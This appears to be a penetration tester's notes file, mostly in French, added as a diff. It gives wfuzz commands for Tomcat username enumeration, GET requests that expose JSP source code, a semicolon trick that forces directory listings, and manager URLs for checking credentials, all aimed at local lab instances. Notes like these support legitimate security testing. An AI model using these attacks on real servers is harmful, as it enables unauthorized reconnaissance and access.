@@ -1,0 +1,59 @@
+# tomcat 
+
+http://tomcat.apache.org/security.html
+
+== CVE-2009-0580 Enumerer les utilisateurs présents dans le tomcat-users.txt
+
+* tomcat-4.0.5
+wfuzz.py -z file -f /path/to/users.txt -d 'j_username=FUZZ' --hc 302 http://127.0.0.1:8080/examples/jsp/security/protected/j_security_check
+
+* tomcat-5.5.25
+utilise pas MemoryRealm par defaut dans conf/server.xml mais UserDatabaseRealm qui ne me semble pas vulnerable
+A confirmer pour les autres versions.
+
+* tomcat-6.0.18
+wfuzz.py -z file -f /tmp/users.txt -d 'j_username=FUZZ&j_password=%' --hw 133 --hl 25 'http://127.0.0.1:8080/examples/jsp/security/protected/j_security_check'
+Le username existe si Content-Length==0.
+
+
+== CVE-2002-1148 Recuperer le code source de pages JSP
+GET /WebApplication2/servlet/org.apache.catalina.servlets.DefaultServlet/index.jsp (cf. http://marc.info/?l=bugtraq&m=103288242014253&w=2 et pourtant j'arrive pas avec /admin/servlet/org.apache.catalina.servlets.DefaultServlet/index.jsp)
+testé avec succès sur 4.1.10 et 4.0.4
+
+== CVE-2002-1394 Recuperer le code source de pages JSP
+GET /WebApplication2/servlet/default/index.jsp  (cf. https://issues.apache.org/bugzilla/show_bug.cgi?id=13365)
+
+== CVE-2006-3835 Directory listing
+This is expected behaviour when directory listings are enabled. The semicolon (;) is the separator for path parameters so inserting one before a file name changes the request into a request for a directory with a path parameter. If directory listings are enabled, a directory listing will be shown. In response to this and other directory listing issues, directory listings were changed to be disabled by default.
+
+prereqs:
+  - dans conf/web.xml:
+<param-name>listings</param-name>
+<param-value>true</param-value>
+  - ya pas de fichier listé comme welcome-file dans /WebApplication2/
+exploit: GET /WebApplication2/;index.html ou ;help.do ou ;index.jsp
+
+
+## HTTPS
+# marche tres bien avec tomcat-4.1.31
+<Connector className="org.apache.coyote.tomcat4.CoyoteConnector"
+           port="8443" minProcessors="5" maxProcessors="75"
+           enableLookups="true"
+           acceptCount="10" debug="0" scheme="https" secure="true"
+           useURIValidationHack="false" disableUploadTimeout="true"
+           clientAuth="false">
+      <Factory className="org.apache.coyote.tomcat4.CoyoteServerSocketFactory"
+               clientAuth="false" protocol="TLS" keystoreFile="/path/to/sys/pki/tomcat.jks" keystorePass="password"/>
+
+</Connector>
+
+# manager-**
+creds are valid when the following URLs does not return 401
+manager-gui /manager/html 
+manager-status /manager/status
+manager-script /manager/text/list
+manager-jmx /manager/jmxproxy
+admin-gui /host-manager/html
+admin-script /host-manager/text/list
+
+
